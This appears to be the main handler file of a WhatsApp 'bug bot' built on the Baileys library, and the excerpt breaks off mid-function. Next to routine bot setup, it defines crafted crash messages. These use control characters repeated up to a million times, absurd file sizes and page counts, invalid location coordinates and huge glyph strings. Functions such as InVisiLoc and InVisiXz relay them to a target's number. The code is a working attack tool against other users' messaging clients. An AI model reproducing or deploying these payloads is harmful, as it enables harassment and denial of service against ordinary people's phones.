const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const { nikParser } = require('nik-parser')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, checkPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc")
const NodeCache = require('node-cache');

const wkwk = fs.readFileSync(`./media/x.mp3`)
const xsteek = fs.readFileSync(`./media/x.webp`)
const o = fs.readFileSync(`./media/o.jpg`)
const { ngazap } = require('./database/virtex/ngazap')
const { buttonkal } = require('./database/virtex/buttonkal')
const { cttl } = require('./database/virtex/cttl')
const { tizi } = require('./database/virtex/tizi')
const { weg } = require('./database/virtex/weg')
const { virtex7 } = require('./database/virtex/virtex7')
const { notif3 } = require("./database/virtex/notif3")
const { notif4 } = require("./database/virtex/notif4")

	// IMAGE \\
		//=================================================//
		const nulll = fs.readFileSync(`./media/image/nulll.jpg`)
		const nulll2 = fs.readFileSync(`./media/image/nulll2.jpg`)
		const Therizxz = fs.readFileSync(`./media/image/Therizxz.jpg`)
		const mods = fs.readFileSync(`./media/image/mods.jpg`)
		// IMAGE RESIZE \\
		const I1 = fs.readFileSync(`./media/image/300/300.jpg`)
		const I2 = fs.readFileSync(`./media/image/300/300x.jpg`)
		const I3 = fs.readFileSync(`./media/image/300/300x300.jpg`)
		const I4 = fs.readFileSync(`./media/image/300/300x300.png`)
		
const { tiktokslide, searchSpotifyTracks, mediafire, igdl, realistic, findSongs, remini, capcut, livecharttba, chat, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { TelegraPH } = require("./lib/TelegraPH")

const audioFilePath = './audio/dead.mp3';
const { apikey } = require('./apikey.json')

const zetAttack = ["https://telegra.ph/file/c1308389f4b7d397eb4cf.jpg", "https://telegra.ph/file/23b0d5381eb88bfe0f34d.jpg", "https://telegra.ph/file/17e9b40d9f8b75e278ab4.jpg", "https://telegra.ph/file/8f0790e50805897e128bc.jpg", "https://telegra.ph/file/66c2eabe95a14de7acd2d.jpg"]
const CzAAttack = zetAttack[Math.floor(Math.random() * zetAttack.length)]

	//=================================================//
		// IMAGE URL \\		
		const images = [
		    "https://files.catbox.moe/8ehkk3.jpg",
		    "https://files.catbox.moe/2krxxm.jpg",
		    "https://files.catbox.moe/5u72ck.jpg",
		    "https://files.catbox.moe/apim8f.jpg",
		    "https://files.catbox.moe/phg56y.jpg",
			"https://telegra.ph/file/e6e5a3bbe152c54f6ac65.jpg",
			"https://telegra.ph/file/4063a5ab22fa48d09a428.jpg",
			"https://files.catbox.moe/cdoqzh.jpg",
			"https://files.catbox.moe/wgikom.jpg",
			"https://files.catbox.moe/u7rpip.jpg",
			"https://files.catbox.moe/0wdlj4.jpg",
			"https://files.catbox.moe/te894y.jpg",
			"https://files.catbox.moe/k7kb29.jpg",
			"https://files.catbox.moe/k7ym9h.jpg",
			"https://files.catbox.moe/8bvwtv.jpg",
			"https://files.catbox.moe/mgjvky.jpg",
			"https://files.catbox.moe/q46i9m.jpg",
			"https://files.catbox.moe/gd6eka.jpg",
			"https://files.catbox.moe/qpeyj5.jpg",
			"https://files.catbox.moe/jwsitc.jpg",
			"https://files.catbox.moe/sdhm35.jpg",
			"https://files.catbox.moe/zx805k.jpg",
			"https://files.catbox.moe/5qk12y.jpg",
			"https://files.catbox.moe/m62aqj.jpg",
			"https://files.catbox.moe/hagvan.jpg",
			"https://files.catbox.moe/ou1ghb.jpg",
			"https://files.catbox.moe/zrd8ey.jpg",
			"https://files.catbox.moe/h1okjg.jpg",
			"https://files.catbox.moe/bw7i7d.jpg"
		];

		function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumbSky = getRandomImage()
//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
//autorep
const VoiceNotefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const Stickerfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const Imagefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const Videofuckdel = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const Docfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const Zipfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const Apkfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

const bugres = '忍耐ディック...🐤.'

const { beta1, beta2, buk1 } = require("./database/hdr.js")
const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
virgam = fs.readFileSync(`./media/o.jpg`)
//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var hariii = `Good Night🌃`
 }
 if(time2 < "19:00:00"){
var hariii = `Good Evening🌃`
 }
 if(time2 < "18:00:00"){
var hariii = `Good Evening🌃`
 }
 if(time2 < "15:00:00"){
var hariii = `Good Afternoon🏙️`
 }
 if(time2 < "11:00:00"){
var hariii = `Good Morning🌆`
 }
 if(time2 < "05:00:00"){
var hariii = `Good Morning🌆`
 } 
module.exports = krocov4 = async (krocov4, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await krocov4.decodeJid(krocov4.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await krocov4.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = krocov4.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? krocov4.user.id.split(':')[0] + "@s.whatsapp.net" || krocov4.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        
        //expiredCheck(krocov4, m, premium);
//group chat msg by fuckdel


let ppuser
try {
ppuser = 'https://telegra.ph/file/c1308389f4b7d397eb4cf.jpg'
} catch (err) {
ppuser = 'https://telegra.ph/file/c1308389f4b7d397eb4cf.jpg'
}

const kalgans = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"I AM\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"ALBYS\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"🤡\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}}
const dok = { 
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}}}

//=================================================//
		//EMOJI\\
		//React Feature 
		const successreact = ['〽️']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return krocov4.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//=================================================//

const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "⚘¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼ .·:¨⋆¨:·. ⚘.̲̅"
}
}
};


const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
		const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐉𝐚𝐜𝐤𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiX = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@Krocov7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const VisiXLoc = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@Krocov7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		// ZNX INVASIONS \\
		async function InVisiLoc(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️",
										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽ 𝐁𝐔𝐆 𝐕𝟐〽️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
												"sections": [{
													"title": "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};

		async function InVisiLocNull(X, Qtd, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️",
										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽ 𝐁𝐔𝐆 𝐕𝟐〽️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
												"sections": [{
													"title": "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);
			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};
		
			async function InVisiXz(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 尺Ẕχ ⿻ ㄈ尺ΛらнらϤらŤƐ௱ ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};

		async function InVisiLocXz(X, ThM, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
